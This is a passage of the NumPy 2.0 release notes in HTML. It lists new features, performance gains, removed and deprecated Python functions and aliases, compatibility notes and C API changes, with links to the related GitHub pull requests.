<li><p>A new variable-length string dtype, <a href="https://numpy.org/devdocs/reference/routines.dtypes.html#numpy.dtypes.StringDType" title="numpy.dtypes.StringDType"><code><span>StringDType</span></code></a> and a new
<a href="https://numpy.org/devdocs/reference/routines.strings.html#module-numpy.strings" title="numpy.strings"><code><span>numpy.strings</span></code></a> namespace with performant ufuncs for string operations,</p></li>
<li><p>Support for <code><span>float32</span></code> and <code><span>longdouble</span></code> in all <a href="https://numpy.org/devdocs/reference/routines.fft.html#module-numpy.fft" title="numpy.fft"><code><span>numpy.fft</span></code></a> functions,</p></li>
<li><p>Support for the array API standard in the main <code><span>numpy</span></code> namespace.</p></li>
</ul>
</li>
<li><p>Performance improvements:</p>
<ul>
<li><p>Sorting functions (<a href="https://numpy.org/devdocs/reference/generated/numpy.sort.html#numpy.sort" title="numpy.sort"><code><span>sort</span></code></a>, <a href="https://numpy.org/devdocs/reference/generated/numpy.argsort.html#numpy.argsort" title="numpy.argsort"><code><span>argsort</span></code></a>, <a href="https://numpy.org/devdocs/reference/generated/numpy.partition.html#numpy.partition" title="numpy.partition"><code><span>partition</span></code></a>, <a href="https://numpy.org/devdocs/reference/generated/numpy.argpartition.html#numpy.argpartition" title="numpy.argpartition"><code><span>argpartition</span></code></a>)
have been accelerated through the use of the Intel x86-simd-sort and Google
Highway libraries, and may see large (hardware-specific) speedups,</p></li>
<li><p>macOS Accelerate support and binary wheels for macOS &gt;=14, with significant
performance improvements for linear algebra operations on macOS, and wheels
that are about 3 times smaller,</p></li>
<li><p><a href="https://numpy.org/devdocs/reference/routines.char.html#module-numpy.char" title="numpy.char"><code><span>numpy.char</span></code></a> fixed-length string operations have been accelerated by
implementing ufuncs that also support <a href="https://numpy.org/devdocs/reference/routines.dtypes.html#numpy.dtypes.StringDType" title="numpy.dtypes.StringDType"><code><span>StringDType</span></code></a> in
addition to the the fixed-length string dtypes,</p></li>
<li><p>A new tracing and introspection API, <a href="https://numpy.org/devdocs/reference/generated/numpy.lib.introspect.opt_func_info.html#numpy.lib.introspect.opt_func_info" title="numpy.lib.introspect.opt_func_info"><code><span>opt_func_info</span></code></a>,
to determine which hardware-specific kernels are available and will be
dispatched to.</p></li>
</ul>
</li>
<li><p>Python API improvements:</p>
<ul>
<li><p>A clear split between public and private API, with a new
<a href="https://numpy.org/devdocs/reference/module_structure.html#module-structure"><span>module structure</span></a>, and each public function now
available in a single place,</p></li>
<li><p>Many removals of non-recommended functions and aliases. This should make
it easier to learn and use NumPy. The number of objects in the main
namespace decreased by ~10% and in <code><span>numpy.lib</span></code> by ~80%,</p></li>
<li><p><a href="https://numpy.org/devdocs/user/basics.types.html#canonical-python-and-c-types"><span>Canonical dtype names</span></a> and a new
<a href="https://numpy.org/devdocs/reference/generated/numpy.isdtype.html#numpy.isdtype" title="numpy.isdtype"><code><span>isdtype</span></code></a> introspection function,</p></li>
</ul>
</li>
<li><p>C API improvements:</p>
<ul>
<li><p>A new <a href="https://numpy.org/devdocs/reference/c-api/array.html#dtype-api"><span>public C API for creating custom dtypes</span></a>,</p></li>
<li><p>Many outdated functions and macros removed, and private internals hidden to
ease future extensibility,</p></li>
<li><p>New, easier to use, initialization functions:
<a href="https://numpy.org/devdocs/reference/c-api/array.html#c.PyArray_ImportNumPyAPI" title="PyArray_ImportNumPyAPI"><code><span>PyArray_ImportNumPyAPI</span></code></a> and <a href="https://numpy.org/devdocs/reference/c-api/ufunc.html#c.PyUFunc_ImportUFuncAPI" title="PyUFunc_ImportUFuncAPI"><code><span>PyUFunc_ImportUFuncAPI</span></code></a>.</p></li>
</ul>
</li>
<li><p>Improved behavior:</p>
<ul>
<li><p>Improvements to type promotion behavior was changed by adopting <a href="https://numpy.org/devdocs/release/NEP50">NEP
50</a>. This fixes many user surprises about promotions which
previously often depended on data values of input arrays rather than only
their dtypes.  Please see the NEP and the <a href="https://numpy.org/devdocs/numpy_2_0_migration_guide.html#numpy-2-migration-guide"><span>NumPy 2.0 migration guide</span></a>
for details as this change can lead to changes in output dtypes and lower
precision results for mixed-dtype operations.</p></li>
<li><p>The default integer type on Windows is now <code><span>int64</span></code> rather than <code><span>int32</span></code>,
matching the behavior on other platforms,</p></li>
<li><p>The maximum number of array dimensions is changed from 32 to 64</p></li>
</ul>
</li>
<li><p>Documentation:</p>
<ul>
<li><p>The reference guide navigation was signficantly improved, and there is now
documentation on NumPy’s <a href="https://numpy.org/devdocs/reference/module_structure.html#module-structure"><span>module structure</span></a>,</p></li>
<li><p>The <a href="https://numpy.org/devdocs/building/index.html#building-from-source"><span>building from source</span></a> documentation was
completely rewritten,</p></li>
</ul>
</li>
</ul>
<p>Furthermore there are many changes to NumPy internals, including continuing to
migrate code from C to C++, that will make it easier to improve and maintain
NumPy in the future.</p>
<p>The “no free lunch” theorem dictates that there is a price to pay for all these
API and behavior improvements and better future extensibility. This price is:</p>
<ol>
<li><p>Backwards compatibility. There are a significant number of breaking changes
to both the Python and C APIs. In the majority of cases, there are clear
error messages that will inform the user how to adapt their code. However,
there are also changes in behavior for which it was not possible to give
such an error message - these cases are all covered in the Deprecation and
Compatibility sections below, and in the <a href="https://numpy.org/devdocs/numpy_2_0_migration_guide.html#numpy-2-migration-guide"><span>NumPy 2.0 migration guide</span></a>.</p>
<p>Note that there is a <code><span>ruff</span></code> mode to auto-fix many things in Python code.</p>
</li>
<li><p>Breaking changes to the NumPy ABI. As a result, binaries of packages that
use the NumPy C API and were built against a NumPy 1.xx release will not
work with NumPy 2.0. On import, such packages will see an <code><span>ImportError</span></code>
with a message about binary incompatibiliy.</p>
<p>It is possible to build binaries against NumPy 2.0 that will work at runtime
with both NumPy 2.0 and 1.x. See <a href="https://numpy.org/devdocs/dev/depending_on_numpy.html#numpy-2-abi-handling"><span>NumPy 2.0-specific advice</span></a> for more details.</p>
<p><strong>All downstream packages that depend on the NumPy ABI are advised to do a
new release built against NumPy 2.0 and verify that that release works with
both 2.0 and 1.26 - ideally in the period between 2.0.0rc1 (which will be
ABI-stable) and the final 2.0.0 release to avoid problems for their users.</strong></p>
</li>
</ol>
<p>The Python versions supported by this release are 3.9-3.12.</p>
</section>
<section id="numpy-2-0-python-api-removals">
<h2>NumPy 2.0 Python API removals<a href="#numpy-2-0-python-api-removals" title="Link to this heading">#</a></h2>
<ul>
<li><p><code><span>np.geterrobj</span></code>, <code><span>np.seterrobj</span></code> and the related ufunc keyword argument
<code><span>extobj=</span></code> have been removed.  The preferred replacement for all of these
is using the context manager <code><span>with</span> <span>np.errstate():</span></code>.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/23922">gh-23922</a>)</p>
</li>
<li><p><code><span>np.cast</span></code> has been removed. The literal replacement for
<code><span>np.cast[dtype](arg)</span></code> is <code><span>np.asarray(arg,</span> <span>dtype=dtype)</span></code>.</p></li>
<li><p><code><span>np.source</span></code> has been removed. The preferred replacement is
<code><span>inspect.getsource</span></code>.</p></li>
<li><p><code><span>np.lookfor</span></code> has been removed.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/24144">gh-24144</a>)</p>
</li>
<li><p><code><span>numpy.who</span></code> has been removed. As an alternative for the removed functionality, one
can use a variable explorer that is available in IDEs such as Spyder or Jupyter Notebook.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/24321">gh-24321</a>)</p>
</li>
<li><p>Warnings and exceptions present in <a href="https://numpy.org/devdocs/reference/routines.exceptions.html#module-numpy.exceptions" title="numpy.exceptions"><code><span>numpy.exceptions</span></code></a> (e.g,
<a href="https://numpy.org/devdocs/reference/generated/numpy.exceptions.ComplexWarning.html#numpy.exceptions.ComplexWarning" title="numpy.exceptions.ComplexWarning"><code><span>ComplexWarning</span></code></a>,
<a href="https://numpy.org/devdocs/reference/generated/numpy.exceptions.VisibleDeprecationWarning.html#numpy.exceptions.VisibleDeprecationWarning" title="numpy.exceptions.VisibleDeprecationWarning"><code><span>VisibleDeprecationWarning</span></code></a>) are no longer exposed in the
main namespace.</p></li>
<li><p>Multiple niche enums, expired members and functions have been removed from
the main namespace, such as: <code><span>ERR_*</span></code>, <code><span>SHIFT_*</span></code>, <code><span>np.fastCopyAndTranspose</span></code>,
<code><span>np.kernel_version</span></code>, <code><span>np.numarray</span></code>, <code><span>np.oldnumeric</span></code> and <code><span>np.set_numeric_ops</span></code>.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/24316">gh-24316</a>)</p>
</li>
<li><p>Replaced <code><span>from</span> <span>...</span> <span>import</span> <span>*</span></code> in the <code><span>numpy/__init__.py</span></code> with explicit imports.
As a result, these main namespace members got removed: <code><span>np.FLOATING_POINT_SUPPORT</span></code>,
<code><span>np.FPE_*</span></code>, <code><span>np.NINF</span></code>, <code><span>np.PINF</span></code>, <code><span>np.NZERO</span></code>, <code><span>np.PZERO</span></code>, <code><span>np.CLIP</span></code>,
<code><span>np.WRAP</span></code>, <code><span>np.WRAP</span></code>, <code><span>np.RAISE</span></code>, <code><span>np.BUFSIZE</span></code>, <code><span>np.UFUNC_BUFSIZE_DEFAULT</span></code>,
<code><span>np.UFUNC_PYVALS_NAME</span></code>, <code><span>np.ALLOW_THREADS</span></code>, <code><span>np.MAXDIMS</span></code>, <code><span>np.MAY_SHARE_EXACT</span></code>,
<code><span>np.MAY_SHARE_BOUNDS</span></code>, <code><span>add_newdoc</span></code>, <code><span>np.add_docstring</span></code> and
<code><span>np.add_newdoc_ufunc</span></code>.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/24357">gh-24357</a>)</p>
</li>
<li><p>Alias <code><span>np.float_</span></code> has been removed. Use <code><span>np.float64</span></code> instead.</p></li>
<li><p>Alias <code><span>np.complex_</span></code> has been removed. Use <code><span>np.complex128</span></code> instead.</p></li>
<li><p>Alias <code><span>np.longfloat</span></code> has been removed. Use <code><span>np.longdouble</span></code> instead.</p></li>
<li><p>Alias <code><span>np.singlecomplex</span></code> has been removed. Use <code><span>np.complex64</span></code> instead.</p></li>
<li><p>Alias <code><span>np.cfloat</span></code> has been removed. Use <code><span>np.complex128</span></code> instead.</p></li>
<li><p>Alias <code><span>np.longcomplex</span></code> has been removed. Use <code><span>np.clongdouble</span></code> instead.</p></li>
<li><p>Alias <code><span>np.clongfloat</span></code> has been removed. Use <code><span>np.clongdouble</span></code> instead.</p></li>
<li><p>Alias <code><span>np.string_</span></code> has been removed. Use <code><span>np.bytes_</span></code> instead.</p></li>
<li><p>Alias <code><span>np.unicode_</span></code> has been removed. Use <code><span>np.str_</span></code> instead.</p></li>
<li><p>Alias <code><span>np.Inf</span></code> has been removed. Use <code><span>np.inf</span></code> instead.</p></li>
<li><p>Alias <code><span>np.Infinity</span></code> has been removed. Use <code><span>np.inf</span></code> instead.</p></li>
<li><p>Alias <code><span>np.NaN</span></code> has been removed. Use <code><span>np.nan</span></code> instead.</p></li>
<li><p>Alias <code><span>np.infty</span></code> has been removed. Use <code><span>np.inf</span></code> instead.</p></li>
<li><p>Alias <code><span>np.mat</span></code> has been removed. Use <code><span>np.asmatrix</span></code> instead.</p></li>
<li><p><code><span>np.issubclass_</span></code> has been removed. Use the <code><span>issubclass</span></code> builtin instead.</p></li>
<li><p><code><span>np.asfarray</span></code> has been removed. Use <code><span>np.asarray</span></code> with a proper dtype instead.</p></li>
<li><p><code><span>np.set_string_function</span></code> has been removed. Use <code><span>np.set_printoptions</span></code>
instead with a formatter for custom printing of NumPy objects.</p></li>
<li><p><code><span>np.tracemalloc_domain</span></code> is now only available from <code><span>np.lib</span></code>.</p></li>
<li><p><code><span>np.recfromcsv</span></code> and <code><span>recfromtxt</span></code> are now only available from <code><span>np.lib.npyio</span></code>.</p></li>
<li><p><code><span>np.issctype</span></code>, <code><span>np.maximum_sctype</span></code>, <code><span>np.obj2sctype</span></code>, <code><span>np.sctype2char</span></code>,
<code><span>np.sctypes</span></code>, <code><span>np.issubsctype</span></code> were all removed from the
main namespace without replacement, as they where niche members.</p></li>
<li><p>Deprecated <code><span>np.deprecate</span></code> and <code><span>np.deprecate_with_doc</span></code> has been removed
from the main namespace. Use <code><span>DeprecationWarning</span></code> instead.</p></li>
<li><p>Deprecated <code><span>np.safe_eval</span></code> has been removed from the main namespace.
Use <code><span>ast.literal_eval</span></code> instead.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/24376">gh-24376</a>)</p>
</li>
<li><p><code><span>np.find_common_type</span></code> has been removed. Use <code><span>numpy.promote_types</span></code> or
<code><span>numpy.result_type</span></code> instead. To achieve semantics for the <code><span>scalar_types</span></code>
argument, use <code><span>numpy.result_type</span></code> and pass <code><span>0</span></code>, <code><span>0.0</span></code>, or <code><span>0j</span></code> as a
Python scalar instead.</p></li>
<li><p><code><span>np.round_</span></code> has been removed. Use <code><span>np.round</span></code> instead.</p></li>
<li><p><code><span>np.nbytes</span></code> has been removed. Use <code><span>np.dtype(&lt;dtype&gt;).itemsize</span></code> instead.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/24477">gh-24477</a>)</p>
</li>
<li><p><code><span>np.compare_chararrays</span></code> has been removed from the main namespace.
Use <code><span>np.char.compare_chararrays</span></code> instead.</p></li>
<li><p>The <code><span>charrarray</span></code> in the main namespace has been deprecated. It can be imported
without a deprecation warning from <code><span>np.char.chararray</span></code> for now,
but we are planning to fully deprecate and remove <code><span>chararray</span></code> in the future.</p></li>
<li><p><code><span>np.format_parser</span></code> has been removed from the main namespace.
Use <code><span>np.rec.format_parser</span></code> instead.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/24587">gh-24587</a>)</p>
</li>
<li><p>Support for seven data type string aliases has been removed from <code><span>np.dtype</span></code>:
<code><span>int0</span></code>, <code><span>uint0</span></code>, <code><span>void0</span></code>, <code><span>object0</span></code>, <code><span>str0</span></code>, <code><span>bytes0</span></code> and <code><span>bool8</span></code>.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/24807">gh-24807</a>)</p>
</li>
<li><p>The experimental <code><span>numpy.array_api</span></code> submodule has been removed. Use the main
<code><span>numpy</span></code> namespace for regular usage instead, or the separate
<code><span>array-api-strict</span></code> package for the compliance testing use case for which
<code><span>numpy.array_api</span></code> was mostly used.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/25911">gh-25911</a>)</p>
</li>
</ul>
<section id="array-prepare-is-removed">
<h3><code><span>__array_prepare__</span></code> is removed<a href="#array-prepare-is-removed" title="Link to this heading">#</a></h3>
<p>UFuncs called <code><span>__array_prepare__</span></code> before running computations
for normal ufunc calls (not generalized ufuncs, reductions, etc.).
The function was also called instead of <code><span>__array_wrap__</span></code> on the
results of some linear algebra functions.</p>
<p>It is now removed. If you use it, migrate to <code><span>__array_ufunc__</span></code> or rely on
<code><span>__array_wrap__</span></code> which is called with a context in all cases, although only
after the result array is filled. In those code paths, <code><span>__array_wrap__</span></code> will
now be passed a base class, rather than a subclass array.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/25105">gh-25105</a>)</p>
</section>
</section>
<section id="deprecations">
<h2>Deprecations<a href="#deprecations" title="Link to this heading">#</a></h2>
<ul>
<li><p><code><span>np.compat</span></code> has been deprecated, as Python 2 is no longer supported.</p></li>
<li><p><code><span>np.safe_eval</span></code> has been deprecated. <code><span>ast.literal_eval</span></code> should be used instead.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/23830">gh-23830</a>)</p>
</li>
<li><p><code><span>np.recfromcsv</span></code>, <code><span>np.recfromtxt</span></code>, <code><span>np.disp</span></code>, <code><span>np.get_array_wrap</span></code>,
<code><span>np.maximum_sctype</span></code>, <code><span>np.deprecate</span></code> and <code><span>np.deprecate_with_doc</span></code>
have been deprecated.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/24154">gh-24154</a>)</p>
</li>
<li><p><code><span>np.trapz</span></code> has been deprecated. Use <code><span>np.trapezoid</span></code> or a <code><span>scipy.integrate</span></code> function instead.</p></li>
<li><p><code><span>np.in1d</span></code> has been deprecated. Use <code><span>np.isin</span></code> instead.</p></li>
<li><p>Alias <code><span>np.row_stack</span></code> has been deprecated. Use <code><span>np.vstack</span></code> directly.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/24445">gh-24445</a>)</p>
</li>
<li><p><code><span>__array_wrap__</span></code> is now passed <code><span>arr,</span> <span>context,</span> <span>return_scalar</span></code> and
support for implementations not accepting all three are deprecated.  Its signature
should be <code><span>__array_wrap__(self,</span> <span>arr,</span> <span>context=None,</span> <span>return_scalar=False)</span></code></p>
<p>(<a href="https://github.com/numpy/numpy/pull/25408">gh-25408</a>)</p>
</li>
<li><p>Arrays of 2-dimensional vectors for <code><span>np.cross</span></code> have been deprecated. Use
arrays of 3-dimensional vectors instead.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/24818">gh-24818</a>)</p>
</li>
<li><p><code><span>np.dtype("a")</span></code> alias for <code><span>np.dtype(np.bytes_)</span></code> was deprecated. Use
<code><span>np.dtype("S")</span></code> alias instead.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/24854">gh-24854</a>)</p>
</li>
<li><p>Use of keyword arguments <code><span>x</span></code> and <code><span>y</span></code> with functions
<code><span>assert_array_equal</span></code> and <code><span>assert_array_almost_equal</span></code> has been deprecated.
Pass the first two arguments as positional arguments instead.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/24978">gh-24978</a>)</p>
</li>
</ul>
<section id="numpy-fft-deprecations-for-n-d-transforms-with-none-values-in-arguments">
<h3><a href="https://numpy.org/devdocs/reference/routines.fft.html#module-numpy.fft" title="numpy.fft"><code><span>numpy.fft</span></code></a> deprecations for n-D transforms with None values in arguments<a href="#numpy-fft-deprecations-for-n-d-transforms-with-none-values-in-arguments" title="Link to this heading">#</a></h3>
<p>Using <code><span>fftn</span></code>, <code><span>ifftn</span></code>, <code><span>rfftn</span></code>, <code><span>irfftn</span></code>, <code><span>fft2</span></code>, <code><span>ifft2</span></code>,
<code><span>rfft2</span></code> or <code><span>irfft2</span></code> with the <code><span>s</span></code> parameter set to a value that is not
<code><span>None</span></code> and the <code><span>axes</span></code> parameter set to <code><span>None</span></code> has been deprecated, in
line with the array API standard. To retain current behaviour, pass a sequence
[0, …, k-1] to <code><span>axes</span></code> for an array of dimension k.</p>
<p>Furthermore, passing an array to <code><span>s</span></code> which contains <code><span>None</span></code> values is
deprecated as the parameter is documented to accept a sequence of integers
in both the NumPy docs and the array API specification. To use the default
behaviour of the corresponding 1-D transform, pass the value matching
the default for its <code><span>n</span></code> parameter. To use the default behaviour for every
axis, the <code><span>s</span></code> argument can be omitted.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/25495">gh-25495</a>)</p>
</section>
<section id="np-linalg-lstsq-now-defaults-to-a-new-rcond-value">
<h3><code><span>np.linalg.lstsq</span></code> now defaults to a new <code><span>rcond</span></code> value<a href="#np-linalg-lstsq-now-defaults-to-a-new-rcond-value" title="Link to this heading">#</a></h3>
<p><a href="https://numpy.org/devdocs/reference/generated/numpy.linalg.lstsq.html#numpy.linalg.lstsq" title="numpy.linalg.lstsq"><code><span>lstsq</span></code></a> now uses the new rcond value of the machine precision
times <code><span>max(M,</span> <span>N)</span></code>.  Previously, the machine precision was used but a
FutureWarning was given to notify that this change will happen eventually.
That old behavior can still be achieved by passing <code><span>rcond=-1</span></code>.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/25721">gh-25721</a>)</p>
</section>
</section>
<section id="expired-deprecations">
<h2>Expired deprecations<a href="#expired-deprecations" title="Link to this heading">#</a></h2>
<ul>
<li><p>The <code><span>np.core.umath_tests</span></code> submodule has been removed from the public API.
(Deprecated in NumPy 1.15)</p>
<p>(<a href="https://github.com/numpy/numpy/pull/23809">gh-23809</a>)</p>
</li>
<li><p>The <code><span>PyDataMem_SetEventHook</span></code> deprecation has expired and it is
removed.  Use <code><span>tracemalloc</span></code> and the <code><span>np.lib.tracemalloc_domain</span></code>
domain.  (Deprecated in NumPy 1.23)</p>
<p>(<a href="https://github.com/numpy/numpy/pull/23921">gh-23921</a>)</p>
</li>
<li><p>The deprecation of <code><span>set_numeric_ops</span></code> and the C functions
<code><span>PyArray_SetNumericOps</span></code> and <code><span>PyArray_GetNumericOps</span></code> has
been expired and the functions removed.  (Deprecated in NumPy 1.16)</p>
<p>(<a href="https://github.com/numpy/numpy/pull/23998">gh-23998</a>)</p>
</li>
<li><p>The <code><span>fasttake</span></code>, <code><span>fastclip</span></code>, and <code><span>fastputmask</span></code>  <code><span>ArrFuncs</span></code>
deprecation is now finalized.</p></li>
<li><p>The deprecated function <code><span>fastCopyAndTranspose</span></code> and its C counterpart
are now removed.</p></li>
<li><p>The deprecation of <code><span>PyArray_ScalarFromObject</span></code> is now finalized.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/24312">gh-24312</a>)</p>
</li>
<li><p><code><span>np.msort</span></code> has been removed. For a replacement, <code><span>np.sort(a,</span> <span>axis=0)</span></code>
should be used instead.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/24494">gh-24494</a>)</p>
</li>
<li><p><code><span>np.dtype(("f8",</span> <span>1)</span></code> will now return a shape 1 subarray dtype
rather than a non-subarray one.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/25761">gh-25761</a>)</p>
</li>
<li><p>Assigning to the <code><span>.data</span></code> attribute of an ndarray is disallowed and will
raise.</p></li>
<li><p><code><span>np.binary_repr(a,</span> <span>width)</span></code> will raise if width is too small.</p></li>
<li><p>Using <code><span>NPY_CHAR</span></code> in <code><span>PyArray_DescrFromType()</span></code> will raise, use
<code><span>NPY_STRING</span></code> <code><span>NPY_UNICODE</span></code>, or <code><span>NPY_VSTRING</span></code> instead.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/25794">gh-25794</a>)</p>
</li>
</ul>
</section>
<section id="compatibility-notes">
<h2>Compatibility notes<a href="#compatibility-notes" title="Link to this heading">#</a></h2>
<section id="loadtxt-and-genfromtxt-default-encoding-changed">
<h3><code><span>loadtxt</span></code> and <code><span>genfromtxt</span></code> default encoding changed<a href="#loadtxt-and-genfromtxt-default-encoding-changed" title="Link to this heading">#</a></h3>
<p><code><span>loadtxt</span></code> and <code><span>genfromtxt</span></code> now both default to <code><span>encoding=None</span></code>
which may mainly modify how <code><span>converters</span></code> work.
These will now be passed <code><span>str</span></code> rather than <code><span>bytes</span></code>. Pass the
encoding explicitly to always get the new or old behavior.
For <code><span>genfromtxt</span></code> the change also means that returned values will now be
unicode strings rather than bytes.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/25158">gh-25158</a>)</p>
</section>
<section id="f2py-compatibility-notes">
<h3><code><span>f2py</span></code> compatibility notes<a href="#f2py-compatibility-notes" title="Link to this heading">#</a></h3>
<p><code><span>f2py</span></code> will no longer accept ambiguous <code><span>-m</span></code> and <code><span>.pyf</span></code> CLI combinations.
When more than one <code><span>.pyf</span></code> file is passed, an error is raised. When both <code><span>-m</span></code>
and a <code><span>.pyf</span></code> is passed, a warning is emitted and the <code><span>-m</span></code> provided name is
ignored.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/25181">gh-25181</a>)</p>
<p>The <code><span>f2py.compile()</span></code> helper has been removed because it leaked memory, has
been marked as experimental for several years now, and was implemented as a thin
<code><span>subprocess.run</span></code> wrapper. It is also one of the test bottlenecks. See
<a href="https://github.com/numpy/numpy/issues/25122">gh-25122</a> for the full
rationale. It also used several <code><span>np.distutils</span></code> features which are too fragile
to be ported to work with <code><span>meson</span></code>.</p>
<p>Users are urged to replace calls to <code><span>f2py.compile</span></code> with calls to
<code><span>subprocess.run("python",</span> <span>"-m",</span> <span>"numpy.f2py",...</span></code> instead, and to use
environment variables to interact with <code><span>meson</span></code>. <a href="https://mesonbuild.com/Machine-files.html">Native files</a> are also an option.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/25193">gh-25193</a>)</p>
</section>
<section id="arange-s-start-argument-is-positional-only">
<h3><code><span>arange</span></code>’s <code><span>start</span></code> argument is positional-only<a href="#arange-s-start-argument-is-positional-only" title="Link to this heading">#</a></h3>
<p>The first argument of <code><span>arange</span></code> is now positional only. This way,
specifying a <code><span>start</span></code> argument as a keyword, e.g. <code><span>arange(start=0,</span> <span>stop=4)</span></code>,
raises a TypeError. Other behaviors, are unchanged so <code><span>arange(stop=4)</span></code>,
<code><span>arange(2,</span> <span>stop=4)</span></code> and so on, are still valid and have the same meaning as
before.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/25336">gh-25336</a>)</p>
</section>
<section id="minor-changes-in-behavior-of-sorting-functions">
<h3>Minor changes in behavior of sorting functions<a href="#minor-changes-in-behavior-of-sorting-functions" title="Link to this heading">#</a></h3>
<p>Due to algorithmic changes and use of SIMD code, sorting functions with methods
that aren’t stable may return slightly different results in 2.0.0 compared to
1.26.x. This includes the default method of <a href="https://numpy.org/devdocs/reference/generated/numpy.argsort.html#numpy.argsort" title="numpy.argsort"><code><span>argsort</span></code></a> and
<a href="https://numpy.org/devdocs/reference/generated/numpy.argpartition.html#numpy.argpartition" title="numpy.argpartition"><code><span>argpartition</span></code></a>.</p>
</section>
<section id="removed-ambiguity-when-broadcasting-in-np-solve">
<h3>Removed ambiguity when broadcasting in <code><span>np.solve</span></code><a href="#removed-ambiguity-when-broadcasting-in-np-solve" title="Link to this heading">#</a></h3>
<p>The broadcasting rules for <code><span>np.solve(a,</span> <span>b)</span></code> were ambiguous when <code><span>b</span></code> had 1
fewer dimensions than <code><span>a</span></code>. This has been resolved in a backward-incompatible
way and is now compliant with the Array API. The old behaviour can be
reconstructed by using <code><span>np.solve(a,</span> <span>b[...,</span> <span>None])[...,</span> <span>0]</span></code>.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/25914">gh-25914</a>)</p>
</section>
<section id="modified-representation-for-polynomial">
<h3>Modified representation for <code><span>Polynomial</span></code><a href="#modified-representation-for-polynomial" title="Link to this heading">#</a></h3>
<p>The representation method for <a href="https://numpy.org/devdocs/reference/generated/numpy.polynomial.polynomial.Polynomial.html#numpy.polynomial.polynomial.Polynomial" title="numpy.polynomial.polynomial.Polynomial"><code><span>Polynomial</span></code></a> was
updated to include the domain in the representation. The plain text and latex
representations are now consistent. For example the output of
<code><span>str(np.polynomial.Polynomial([1,</span> <span>1],</span> <span>domain=[.1,</span> <span>.2]))</span></code> used to be <code><span>1.0</span> <span>+</span>
<span>1.0</span> <span>x</span></code>, but now is <code><span>1.0</span> <span>+</span> <span>1.0</span> <span>(-3.0000000000000004</span> <span>+</span> <span>20.0</span> <span>x)</span></code>.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/21760">gh-21760</a>)</p>
</section>
</section>
<section id="c-api-changes">
<h2>C API changes<a href="#c-api-changes" title="Link to this heading">#</a></h2>
<ul>
<li><p>The <code><span>PyArray_CGT</span></code>, <code><span>PyArray_CLT</span></code>, <code><span>PyArray_CGE</span></code>, <code><span>PyArray_CLE</span></code>,
<code><span>PyArray_CEQ</span></code>, <code><span>PyArray_CNE</span></code> macros have been removed.</p></li>
<li><p><code><span>PyArray_MIN</span></code> and <code><span>PyArray_MAX</span></code> have been moved from <code><span>ndarraytypes.h</span></code>
to <code><span>npy_math.h</span></code>.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/24258">gh-24258</a>)</p>
</li>
<li><p>A C API for working with <a href="https://numpy.org/devdocs/reference/routines.dtypes.html#numpy.dtypes.StringDType" title="numpy.dtypes.StringDType"><code><span>numpy.dtypes.StringDType</span></code></a> arrays has been exposed.
This includes functions for acquiring and releasing mutexes which lock access
to the string data, as well as packing and unpacking UTF-8 bytestreams from
array entries.</p></li>
<li><p><code><span>NPY_NTYPES</span></code> has been renamed to <code><span>NPY_NTYPES_LEGACY</span></code> as it does not
include new NumPy built-in DTypes. In particular the new string DType
will likely not work correctly with code that handles legacy DTypes.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/25347">gh-25347</a>)</p>
</li>
<li><p>The C-API now only exports the static inline function versions
of the array accessors (previously this depended on using “deprecated API”).
While we discourage it, the struct fields can still be used directly.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/25789">gh-25789</a>)</p>
</li>
<li><p>NumPy now defines <a href="https://numpy.org/devdocs/reference/c-api/array.html#c.PyArray_Pack" title="PyArray_Pack"><code><span>PyArray_Pack</span></code></a> to set an individual memory
address.  Unlike <code><span>PyArray_SETITEM</span></code> this function is equivalent to setting
an individual array item and does not require a NumPy array input.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/25954">gh-25954</a>)</p>
</li>
<li><p>The <code><span>-&gt;f</span></code> slot has been removed from <code><span>PyArray_Descr</span></code>.
If you use this slot, replace accessing it with
<code><span>PyDataType_GetArrFuncs</span></code> (see its documentation and the
<a href="https://numpy.org/devdocs/numpy_2_0_migration_guide.html#numpy-2-migration-guide"><span>NumPy 2.0 migration guide</span></a>). In some cases using other functions like
<code><span>PyArray_GETITEM</span></code> may be an alternatives.</p></li>
<li><p><code><span>PyArray_GETITEM</span></code> and <code><span>PyArray_SETITEM</span></code> now require the import of the
NumPy API table to be used and are no longer defined in <code><span>ndarraytypes.h</span></code>.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/25812">gh-25812</a>)</p>
</li>
<li><p>Due to runtime dependencies, the definition for functionality accessing
the dtype flags was moved from <code><span>numpy/ndarraytypes.h</span></code> and is only available
after including <code><span>numpy/ndarrayobject.h</span></code> as it requires <code><span>import_array()</span></code>.
This includes <code><span>PyDataType_FLAGCHK</span></code>, <code><span>PyDataType_REFCHK</span></code> and
<code><span>NPY_BEGIN_THREADS_DESCR</span></code>.</p></li>
<li><p>The dtype flags on <code><span>PyArray_Descr</span></code> must now be accessed through the
<code><span>PyDataType_FLAGS</span></code> inline function to be compatible with both 1.x and 2.x.
This function is defined in <code><span>npy_2_compat.h</span></code> to allow backporting.
